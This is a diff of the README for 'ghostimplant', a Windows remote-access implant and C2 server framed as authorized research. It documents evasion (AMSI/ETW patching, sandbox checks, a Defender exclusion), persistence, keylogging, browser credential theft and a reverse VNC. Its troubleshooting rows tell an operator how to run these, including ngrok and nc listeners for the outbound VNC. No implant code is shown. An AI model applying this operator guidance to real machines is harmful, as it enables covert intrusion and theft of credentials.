-| **Server identity is not authenticated** | The handshake authenticates the *beacon token*, not the server, and the transport ignores certificate errors by design. An active HTTPS-MITM positioned in front of the server can interpose. Channel encryption targets passive observers and the tunnel provider, not an active adversary. Certificate pinning is on the [roadmap](#22-roadmap). |
+| **Server identity is not authenticated** | The handshake authenticates the *beacon token*, not the server, and WinHTTP is deliberately configured with `SECURITY_FLAG_IGNORE_UNKNOWN_CA`, `_CERT_DATE_INVALID`, `_CERT_WRONG_USAGE` and `_CERT_CN_INVALID` — so an active HTTPS-MITM in front of the server can interpose. Channel encryption defends against passive observers and the tunnel provider, not an active adversary. Certificate pinning is on the [roadmap](#22-roadmap). |
 | Ephemeral XOR key | The rotating 4-byte key is a compile-time constant; anyone with the source can decrypt sample strings. It raises the bar for automated matching, not for a human analyst. |
 | **In-memory state only** | No database: restarting the server discards sessions, results, task queues, audit trail and the staged payload. The re-handshake path recovers agents, not history. |
 | No asymmetric operator auth | The operator token is a shared bearer secret over the dashboard/CLI; there is no per-user identity, so the audit trail attributes actions to tokens and IPs, not people. |
@@ -743,11 +774,11 @@ Documented deliberately — these are part of the thesis, not bugs to hide.
 | Windows-only, x64-only | Syscall stubs use `4C 8B D1 B8` (x64) patterns; no ARM64 or 32-bit support, no cross-platform implant. |
 | AMSI/ETW patching is per-process | It silences in-process reporting for the implant only; it does not disable system-wide EDR telemetry, and modern EDRs detect the patch itself. |
 | Beacon cadence is a signature | Jitter hides fixed intervals from naive thresholds but the 18–24 s volume and cadence remain highly regular. Rapid-poll shell mode (1 s) is trivially visible on the wire. |
-| Manual enrolment is optional | `--auto-accept` accepts every agent that presents the beacon token — convenient in a lab, unsafe anywhere a token could leak. |
+| Manual enrollment is optional | `--auto-accept` accepts every agent that presents the beacon token — convenient in a lab, unsafe anywhere a token could leak. |
 
 ---
 
-## 19 · Troubleshooting
+## 19. Troubleshooting
 
 | Symptom | Cause | Fix |
 |---|---|---|
@@ -764,14 +795,14 @@ Documented deliberately — these are part of the thesis, not bugs to hide.
 | `waiting…` then `Timed out waiting for result (90 s)` | Beacon interval longer than the CLI timeout, or the task is slow (large upload) | `!shell` for rapid polling, `results <sid>` later, or `sleep 5` to shorten the interval |
 | Screenshot is a corrupt/blank image | Result truncated in transit | Expected only if the 32 MB exemption is exceeded — capture at a lower `scale` |
 | Nothing persists after reboot | Non-elevated run skips HKLM/HIGHEST paths and Defender exclusion | Run once elevated to exercise the privileged branches |
-| Implant idles forever on a VM | Sandbox heuristic (uptime < 240 s and < 50 processes) | Let the VM sit at a logged-in desktop for a few minutes, or build `--debug` (checks disabled) |
-| VNC viewer connects to nothing | `!vnc` **dials out** | Start the listener first (`ngrok tcp 5500` or a local `nc -l`), then task `!vnc <host:port>` |
-| `[app-bound encrypted - not recoverable]` | Chrome ≥ 127 v20 entries | Expected and documented; see [Limitations](#18-known-limitations--scope) |
+| Implant idles forever on a VM | Sandbox heuristic (uptime under 240 s and fewer than 50 processes) | Let the VM sit at a logged-in desktop for a few minutes, or build `--debug` (checks disabled) |
+| VNC viewer shows nothing | `!vnc` **dials out**, so the viewer must listen first | Start `vncviewer -listen` (or an ngrok TCP endpoint in front of it) **before** tasking `!vnc <host:port>`; `nc -l <port>` only proves the connection lands, it cannot render a desktop |
+| `[app-bound encrypted - not recoverable]` | Chrome ≥ 127 v20 entries | Expected and documented; see [Limitations](#18-known-limitations-and-scope) |
 | Two identical sessions in the list | Same session id with different per-run ids after a restart | Normal — the 8-hex run id distinguishes them |
 
 ---
 
-## 20 · Project Layout
+## 20. Project layout
 
 ```text
 ghostimplant/
@@ -784,7 +815,7 @@ ghostimplant/
 │   ├── injection.hpp       injection + PPID spoofing
 │   ├── persistence.hpp     registry / WMI / scheduled task install + remove
 │   ├── keylog.hpp          hook lifecycle
-│   └── vnc.cpp interface   RFB server
+│   └── vnc.hpp             reverse-VNC server interface
 ├── src/
 │   ├── main.cpp        (374)   entry, PEB spoof, self-install, supervisor, startup order
 │   ├── c2.cpp          (1962)  transport, ECDH/AES, beacon loop, command table, all handlers
@@ -808,12 +839,12 @@ ghostimplant/
 │   └── test_browser.ps1        synthetic-profile recovery test
 ├── resources/                  PE version resource, manifest, prank wallpaper
 ├── .github/workflows/ci.yml    protocol tests + MinGW cross-compile
-└── build.sh                    cross-compile, strip, timestamp randomisation
+└── build.sh                    cross-compile, strip, timestamp randomization
 ```
 
 ---
 
-## 21 · Contributing
+## 21. Contributing
 
 Contributions aimed at **research and detection value** are welcome.
 
@@ -821,14 +852,14 @@ Contributions aimed at **research and detection value** are welcome.
 2. Implant work must stay warning-clean with MinGW `-Wall -Wextra` and must not add API name or
    URL string literals — use `XS`/`XSW`/`FNV`/`HASHPROC`.
 3. Any protocol change requires a matching case in `tests/test_protocol.py`; both CI jobs must pass.
-4. Add or update the [ATT&CK row](#16-mitre-attack-mapping) and the [detection guidance](#17-detection-guidance)
+4. Add or update the [ATT&CK row](#16-mitre-attck-mapping) and the [detection guidance](#17-detection-guidance)
    for anything new — an undocumented technique has no research value.
 5. Never commit tokens, tunnel URLs, `build/` output, `.exe` artifacts, or captures from a real target.
 6. Keep the authorized-use notice intact in any derived documentation.
 
 ---
 
-## 22 · Roadmap
+## 22. Roadmap
 
 - [ ] DNS-over-HTTPS fallback channel
 - [ ] Optional server-certificate pinning in the implant (closes the active-MITM gap)
@@ -839,9 +870,9 @@ Contributions aimed at **research and detection value** are welcome.
 
 ---
 
-## 23 · License & Permitted Use
+## 23. License and permitted use
 
-This project is **not** offered under an open-source licence. No file named `LICENSE` exists in the
+This project is **not** offered under an open-source license. No file named `LICENSE` exists in the
 repository and all rights are reserved by the author; the badges above describe it as restricted and
 research-only on purpose.
 
@@ -856,7 +887,7 @@ prohibited. Requests beyond that scope should go to the repository owner.
 
 ---
 
-## 24 · Disclaimer
+## 24. Disclaimer
 
 This software is provided for **educational and authorized research purposes only**. It implements
 techniques that are illegal to use against systems you do not own or lack written authorization to
